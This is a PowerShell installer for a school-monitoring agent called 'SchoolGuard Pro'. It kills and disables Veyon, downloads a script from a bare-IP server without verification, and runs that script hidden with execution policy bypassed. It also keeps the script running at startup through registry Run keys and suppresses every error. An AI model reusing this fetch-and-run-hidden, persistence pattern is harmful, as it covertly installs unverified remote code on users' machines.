# ============================================================================
# SchoolGuard Pro - 1-Click Windows Installer (Pure ASCII)
# Works in PowerShell, CMD, and Win+R without requiring Admin or Python
# ============================================================================
$ErrorActionPreference = "SilentlyContinue"

Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "   CAI DAT SCHOOLGUARD PRO TREN WINDOWS (AUTO-CONNECT VPS)      " -ForegroundColor Yellow
Write-Host "================================================================" -ForegroundColor Cyan

# 1. Enable TLS 1.2 + C# SSL callback
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
} catch {}

# 2. Stop & Disable Veyon if present
$veyonProcs = @("VeyonWorker", "VeyonMaster", "VeyonService", "veyon-service", "veyon-worker", "veyon-master", "veyon-configurator", "veyon-server")
foreach ($vp in $veyonProcs) {
    Stop-Process -Name $vp -Force -ErrorAction SilentlyContinue
    & taskkill.exe /F /IM "$vp.exe" /T 2>$null | Out-Null
}
& sc.exe stop VeyonService 2>$null | Out-Null
& sc.exe config VeyonService start= disabled 2>$null | Out-Null

# 3. Stop any existing SchoolGuard agent_win.ps1 process
try {
    $procs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue
    foreach ($p in $procs) {
        if ($p.ProcessId -ne $PID -and $p.CommandLine -match "agent_win\.ps1") {
            Stop-Process -Id $p.ProcessId -Force -ErrorAction SilentlyContinue
            & taskkill.exe /F /PID $p.ProcessId 2>$null | Out-Null
        }
    }
} catch {}

# 4. Prepare installation directory
$installDir = Join-Path $env:LOCALAPPDATA "SchoolGuard"
if (-not (Test-Path $installDir)) {
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
}
$agentPath = Join-Path $installDir "agent_win.ps1"
Remove-Item -Path $agentPath -Force -ErrorAction SilentlyContinue

# 5. Download latest agent_win.ps1
Write-Host "[*] Dang tai agent_win.ps1 tu VPS..." -ForegroundColor Cyan
$urls = @(
    "https://103-149-172-179.sslip.io/agent/agent_win.ps1",
    "http://103.149.172.179:4000/agent/agent_win.ps1",
    "https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/agent_win.ps1"
)
$wc = New-Object System.Net.WebClient
foreach ($u in $urls) {
    if (-not (Test-Path $agentPath) -or (Get-Item $agentPath).Length -lt 1000) {
        try {
            $wc.DownloadFile($u, $agentPath)
        } catch {}
    }
}

if (-not (Test-Path $agentPath) -or (Get-Item $agentPath).Length -lt 1000) {
    Write-Host "[ERROR] Khong the tai agent_win.ps1. Vui long kiem tra mang!" -ForegroundColor Red
    exit 1
}

try {
    if (Test-Path "C:\ProgramData") {
        $sysDir = "C:\ProgramData\SchoolGuard"
        if (-not (Test-Path $sysDir)) { New-Item -ItemType Directory -Path $sysDir -Force | Out-Null }
        Copy-Item -Path $agentPath -Destination (Join-Path $sysDir "agent_win.ps1") -Force -ErrorAction SilentlyContinue
    }
} catch {}

# 6. Create run_hidden.vbs launcher
$vbsPath = Join-Path $installDir "run_hidden.vbs"
$vbsContent = "Set WshShell = CreateObject(""WScript.Shell"")`r`nWshShell.Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """"$agentPath"""""", 0, False"
[System.IO.File]::WriteAllText($vbsPath, $vbsContent, [System.Text.Encoding]::ASCII)

# 7. Register startup in Registry (HKCU works without Admin)
try {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SchoolGuardAgent" -Value "wscript.exe `"$vbsPath`"" -Force
} catch {}
try {
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SchoolGuardAgent" -Value "wscript.exe `"$vbsPath`"" -Force
} catch {}

# 8. Launch agent_win.ps1 in background immediately
Write-Host "[*] Dang khoi dong ngam SchoolGuard Agent..." -ForegroundColor Cyan
$launched = $false
try {
    $res = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "wscript.exe `"$vbsPath`"" }
    if ($res -and $res.ReturnValue -eq 0) { $launched = $true }
} catch {}

if (-not $launched) {
    try {
        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
        $launched = $true
    } catch {}
}

try {
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$agentPath`"" -WindowStyle Hidden
} catch {}

Write-Host ""
Write-Host "================================================================" -ForegroundColor Green
Write-Host " [OK] DA KET NOI MAY WINDOWS VAO HE THONG SCHOOLGUARD PRO!      " -ForegroundColor Green
Write-Host " -> Kiem tra ngay tren Web: https://103-149-172-179.sslip.io    " -ForegroundColor Yellow
Write-Host "================================================================" -ForegroundColor Green
Write-Host ""
